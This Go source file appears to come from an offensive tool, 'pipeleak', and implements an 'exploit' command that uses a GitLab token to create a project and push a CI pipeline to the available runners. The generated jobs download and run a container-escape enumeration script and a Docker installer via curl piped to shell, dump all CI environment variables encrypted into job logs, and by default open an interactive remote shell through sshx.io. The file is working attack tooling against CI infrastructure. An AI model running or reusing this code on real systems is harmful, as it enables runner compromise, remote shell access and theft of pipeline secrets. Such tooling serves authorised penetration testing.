package runners

import (
	"github.com/CompassSecurity/pipeleak/helper"
	"github.com/rs/zerolog/log"
	"github.com/spf13/cobra"
	gogit "gitlab.com/gitlab-org/api/client-go"
	ci "gitlab.com/mitchenielsen/gitlab-ci-go"
)

var runnerTags []string
var ageEncryptionPublicKey string
var repoName string
var dry bool
var shell bool

func NewRunnersExploitCmd() *cobra.Command {
	exploitCmd := &cobra.Command{
		Use:   "exploit [no options!]",
		Short: "Creates a project, generates a job per available runner tag and runs a default .gitlab-Ci.yml definition",
		Run:   Exploit,
	}

	exploitCmd.Flags().StringSliceVarP(&runnerTags, "tags", "", []string{}, "Jobs with the following tags are created")
	exploitCmd.Flags().StringVarP(&ageEncryptionPublicKey, "agePublicKey", "", "", "An age public key generated with ./age-keygen -o key.txt (repo: https://github.com/FiloSottile/age). Prints the encrypted environment variables in the output log.")
	exploitCmd.Flags().StringVarP(&repoName, "repoName", "", "pipeleak-runner-test", "The name for the created repository")
	exploitCmd.PersistentFlags().BoolVarP(&dry, "dry", "d", false, "Only genereate and print the .gitlab-ci.yml, do NOT create real jobs")
	exploitCmd.PersistentFlags().BoolVarP(&shell, "shell", "s", true, "Add an SSHX interactive shell to the jobs")

	return exploitCmd
}

func Exploit(cmd *cobra.Command, args []string) {
	helper.SetLogLevel(verbose)
	exploitRunners(runnerTags, dry, shell, gitlabApiToken, gitlabUrl, ageEncryptionPublicKey, repoName)
	log.Info().Msg("Done, Bye Bye 🏳️‍🌈🔥")
}

var exploitScript = []string{
	"echo \"Pipeleak exploit job\"",
	"id",
	"whoami",
	"curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh",
	"chmod +x deepce.sh",
	"./deepce.sh",
}

var exploitJobCOnfig = ci.JobConfig{
	Stage: "exploit",
	Image: "ubuntu:latest",
	BeforeScript: []string{
		"apt update && apt install curl libcap2-bin -y",
		"curl -fsSL https://get.docker.com -o get-docker.sh",
		"sh ./get-docker.sh",
	},
}

func exploitRunners(runnerTags []string, dry bool, shell bool, gitlabApiToken string, gitlabUrl string, ageEncryptionPublicKey string, repoName string) {

	gitlabCiYml := generateCIYml(runnerTags, shell, ageEncryptionPublicKey)

	if len(ageEncryptionPublicKey) > 0 {
		log.Info().Msg("Decrypt age (https://github.com/FiloSottile/age/releases) output locally using: age --decrypt -i key.txt age_output.txt")
	}

	if dry {
		log.Info().Msg("Generated .gitlab-ci.yml")
		log.Info().Msg(gitlabCiYml)
		log.Info().Msg("Create your project and .gitlab-ci.yml manually")
		return
	}

	git, err := gogit.NewClient(gitlabApiToken, gogit.WithBaseURL(gitlabUrl))
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating gitlab client")
	}

	opts := &gogit.CreateProjectOptions{
		Name:        gogit.Ptr(repoName),
		JobsEnabled: gogit.Ptr(true),
	}

	project, _, err := git.Projects.CreateProject(opts)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating project")
	}

	log.Info().Str("name", project.Name).Str("url", project.WebURL).Msg("Created project")

	fileOpts := &gogit.CreateFileOptions{
		Branch:        gogit.Ptr("main"),
		Content:       gogit.Ptr(gitlabCiYml),
		CommitMessage: gogit.Ptr("Pipeleak create .gitlab-ci.yml"),
	}
	fileInfo, _, err := git.RepositoryFiles.CreateFile(project.ID, ".gitlab-ci.yml", fileOpts)

	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Creating .gitlab-ci.yml failed")
	}

	log.Info().Str("file", fileInfo.FilePath).Msg("Created .gitlab-ci.yml")
	log.Info().Str("url", project.WebURL+"/-/pipelines").Msg("Check pipeline logs manually")
	log.Info().Msg("Make sure to delete the project when done")
}

func generateCIYml(runnerTags []string, shell bool, ageEncryptionPublicKey string) string {
	yml := ci.CI{
		Globals: ci.Globals{Stages: []string{"exploit"}},
		Jobs:    map[string]ci.JobConfig{},
	}

	job := exploitJobCOnfig
	job.Script = exploitScript

	if len(ageEncryptionPublicKey) > 0 {
		job.Script = append(job.Script, "curl -s https://api.github.com/repos/FiloSottile/age/releases/latest | \\\n grep download/.*linux-amd64.tar.gz | \\\n cut -d : -f 2,3 | \\\n xargs curl -O -L")
		job.Script = append(job.Script, "tar -xzvf *linux-amd64.tar.gz")
		job.Script = append(job.Script, "env |\\\n ./age/age -a -r "+ageEncryptionPublicKey)
	}

	if shell {
		job.Script = append(job.Script, "curl -sSf https://sshx.io/get | sh -s run")
	}

	if len(runnerTags) == 0 {
		yml.Jobs["pipeleak-job"] = job
	} else {
		for _, tag := range runnerTags {
			job.Tags = []string{tag}
			yml.Jobs["pipeleak-job-"+tag] = job
		}

	}

	yamlData, err := yml.Build()

	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed marshalling yml")
	}

	return string(yamlData)
}
